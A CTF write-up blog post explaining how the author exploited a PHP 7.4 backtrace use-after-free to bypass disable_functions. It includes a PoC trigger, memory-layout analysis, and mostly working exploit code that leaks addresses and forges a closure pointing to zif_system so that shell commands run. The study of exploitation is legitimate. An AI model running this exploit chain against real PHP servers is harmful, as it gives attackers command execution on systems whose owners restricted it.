---
layout: post
title:  "Easy PHP UAF"
date:   2020-05-04 00:00:00 +0000
categories: jekyll update
---

## 0x00 Overview

Although I failed to solve the challenge during CTF, but I think it is worthwhile to do a write-up.

The challenge is to exploit a PHP script engine using [this bug](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php). We can execute arbitrary PHP code but we must bypass `disabled_function` restriction to execute shell command, using a UAF vulnerability. Therefore, this is actually more a Pwn challenge than a Web challenge.

However, different from official PHP engine, a custom `libphp7.so` is provided. This engine does not provide any loop functionality such as `for/while/do-while/foreach`. Moreover, in remote server, the recursion depth is also restricted, and `strlen` function always returns `NULL`, even though these cases do not occur in my local environment.

The exploit idea is similar to the exploit provided in Github: use UAF to overlap a string with an object, so that we can leak the addresses, then clone a function object and rewrite relevant function pointer to make the function `system`.

## 0x01 Environment

Firstly, we pull and run the docker provided by challenge:

```bash
sudo docker pull php:7.4.2-apache
sudo docker run -i -t php:7.4.2-apache /bin/bash
```

Then, start the apache server:

```bash
# -------- commands in host shell --------
sudo docker cp libphp7.so [hex id shown in bash shell]:/usr/lib/apache2/modules/libphp7.so
# replace the libphp7 to provided libphp7
sudo docker cp exp.php [hex id shown in bash shell]:/var/www/html/index.php
# copy the exploit into docker

# -------- commands in docker shell --------
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# set some necessary environment variable
apache2ctl -X
# start apache server
```

To debug the apache server, what I did is just use `gdb` outside docker and attach to the `apache2ctl` process. The functionality is pretty rudimentary, but it is okay if you just want to inspect memory status at crash.

## 0x02 Bug

*In my understanding*, The use-after-free is caused by freeing variables without reference(e.i. `ref count = 0`) before putting the local variables into the `backtrace`. In this way already freed variables can be re-accessed by accessing `backtrace`. As the [patch](http://git.php.net/?p=php-src.git;a=commitdiff;h=ef1e4891b47949c8dc0f9482eef9454a0ecdfa1d;hp=8226e704e4e6066a5bd41b57b2934a3371896be2) suggests, the way to fix is just to put stack frame unlink before freeing variables:

>Unlink the current stack frame before freeing CVs or extra args.
>This means it will no longer show up in back traces that are
>generated during CV destruction.
>
>We already did this prior to destructing the object/closure,
>presumably for the same reason.

The PoC with explanation is shown below:

```php
class Vuln {
    public $a;
    public function __destruct() {
        global $backtrace;
        unset($this->a);
        $backtrace = (new Exception)->getTrace(); // backtrace has ref to $arg
    }
}
function trigger_uaf($arg) {
    $arg = str_shuffle(str_repeat('A', 79)); // string to be UAFed
    $vuln = new Vuln();
    $vuln->a = $arg;
}
trigger_uaf('x');
$backtrace[0]['args'][1] // access UAF string
```

## 0x03 Exploit

### PHP Object Memory Layout

Before exploiting any script engine, one critical thing to know is how object is stored in this script engine. In this case, we need to know how `string` and other PHP objects are stored in memory, since the best way to exploit UAF is to replace the just freed string with another PHP object to have type confusion. In this way we may do some evil stuff such as leaking critical memory addresses by reading from that PHP string.

Thanks to @Anciety who helped me to find [definition of various PHP types](https://github.com/php/php-src/blob/master/Zend/zend_types.h), I can investigate the exploitation more conveniently.

The exploit method that the provided exploit is using is to obfuscate PHP string with PHP object created from class. Here are definitions of these 2 types:

```c
struct _zend_string {
    zend_refcounted_h gc;
    zend_ulong        h;                /* hash value */
    size_t            len;
    char              val[1];
};
struct _zend_object {
    zend_refcounted_h gc;
    uint32_t          handle; // TODO: may be removed ???
    zend_class_entry *ce;
    const zend_object_handlers *handlers;
    HashTable        *properties;
    zval              properties_table[1]; 
    // zval is a union followed by its type description
    // for example: string is _zend_string* pointer and 0x6
};
```

The overlap is shown below:

```
string      object
gc          gc
h           handle
len         ce
val+0       handlers
val+8       properties
val+16      first field
val+24      type of first field
       ...
```

### Leak

Therefore, we can leak pointer of object by reading content in `+0x10` offset. In addition, pointer `handlers` points to somewhere at `libphp7.so` so that we can also leak base address of `libphp7`.

```php
$helper = new Helper;
$helper->a = $helper;
$helper->b = function($x) {};
$helper->c = 0x1337;

$closure_handlers = str2ptr($abc, 0);
$php_heap = str2ptr($abc, 0x10);
// leaker address of $helper, which is also that of $abc
$helper->a = "helper"; 
// if we still have circular reference, 
// a strage crash will occur when rewriting string,
// so we remove circular reference here
$abc_addr = $php_heap + 0x18;
$libphp_addr = str2ptr($abc, 0) - 0xd73ec0;
$zif_system = $libphp_addr + 0x355a86;
// leak libphp and thus zif_system function
$helper->b = function($x){};
$closure_obj = str2ptr($abc, 0x20);
// leak a pointer pointing to a user-defined function object
```

By the way, the way to leak `abc_addr` resented in provided exploit does not work here, I don't know why. In addition, the ELF stuff inside provided exploit is not necessary, because we already know the `libphp7` so that `zif_system` address can be calculated directly.

### Code Execution

This is actually the part the got me stuck for very long time. The primary objective is to rewrite the function in `b` field to PHP system function. As the provided exploit suggests, we need to write `$closure_obj+0x38` to 1 and `$closure_obj+0x68` to `zif_system`.  I have came up with 4 approaches, but only the last one works:

1. Fake a string object to build a arbitrary write primitive, but it seems that when writing to string fetched from object field, the engine will copy it first before writing, which means we cannot rewrite the function object directly.
2. Since the length of `$abc` is very big(e.i. an 6-byte address), we can directly use `$abc` to write content in `$closure_obj`. However, this requires `$closure_obj` to be larger that `$abc_addr`, which means the function object must lay behind `$abc` in memory. This is true when we execute the script directly, but when converting exploit into string and executing it using `eval`, this property does not hold.
3. Re-trigger the vulnerability but fill the just-freed string with a function object, but it seems that I cannot achieve this after many trials.
4. Copy the contents inside `$closure_obj` and change the relevant field in the copied fake object. This is the approach used by provided exploit. However, we cannot use `strlen` function to achieve arbitrary memory read, unlike the provided exploit. My approach is to interpret address `$closure_obj` as a PHP string so that we can read contents after `+0x18` offset. As for copying, since the recursion depth and loop are restricted, we just copy and paste the code to achieve the copy. The relevant codes are shown below:

```php
// fake value
write($abc, 0x10, $closure_obj);
write($abc, 0x18, 0x6); 
// fake a string object at $closure_obj

function copyFunc($off)
{
    global $helper;
    global $abc;
    if ($off > 0x110) return;
    write($abc, 0xd0 + 0x18 + $off, str2ptr($helper->a, $off));
    write($abc, 0xd0 + 0x20 + $off, str2ptr($helper->a, $off+8));
    write($abc, 0xd0 + 0x28 + $off, str2ptr($helper->a, $off+0x10));
    write($abc, 0xd0 + 0x30 + $off, str2ptr($helper->a, $off+0x18));
    write($abc, 0xd0 + 0x38 + $off, str2ptr($helper->a, $off+0x20));
    write($abc, 0xd0 + 0x40 + $off, str2ptr($helper->a, $off+0x28));
    write($abc, 0xd0 + 0x48 + $off, str2ptr($helper->a, $off+0x30));
    write($abc, 0xd0 + 0x50 + $off, str2ptr($helper->a, $off+0x38));
    write($abc, 0xd0 + 0x58 + $off, str2ptr($helper->a, $off+0x40));
    write($abc, 0xd0 + 0x60 + $off, str2ptr($helper->a, $off+0x48));
    write($abc, 0xd0 + 0x68 + $off, str2ptr($helper->a, $off+0x50));
    write($abc, 0xd0 + 0x70 + $off, str2ptr($helper->a, $off+0x58));
    write($abc, 0xd0 + 0x78 + $off, str2ptr($helper->a, $off+0x60));
    write($abc, 0xd0 + 0x80 + $off, str2ptr($helper->a, $off+0x68));
    write($abc, 0xd0 + 0x88 + $off, str2ptr($helper->a, $off+0x70));
    write($abc, 0xd0 + 0x90 + $off, str2ptr($helper->a, $off+0x78));
    write($abc, 0xd0 + 0x98 + $off, str2ptr($helper->a, $off+0x80));
    write($abc, 0xd0 + 0xa0 + $off, str2ptr($helper->a, $off+0x88));
    copyFunc($off + 0x90);
} // function to copy the content inside $closure_obj

write($abc, 0xd0, 0x0000031800000002);
write($abc, 0xd0 + 8, 0x0000000000000003);
// write some headers in $closure_obj, 
// which are simply constants from gdb
copyFunc(0); // copy body in $closure_obj

write($abc, 0xd0 + 0x38, 0x0210000000000001);
write($abc, 0xd0 + 0x68, $zif_system);
// rewrite critical fields to make the function `system`
write($abc, 0x20, $abc_addr + 0xd0);
// rewrite pointer of field b to newly faked function object

($helper->b)($cmd);
die("end");
```

The full exploit is [here](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/easyphpuaf.php).
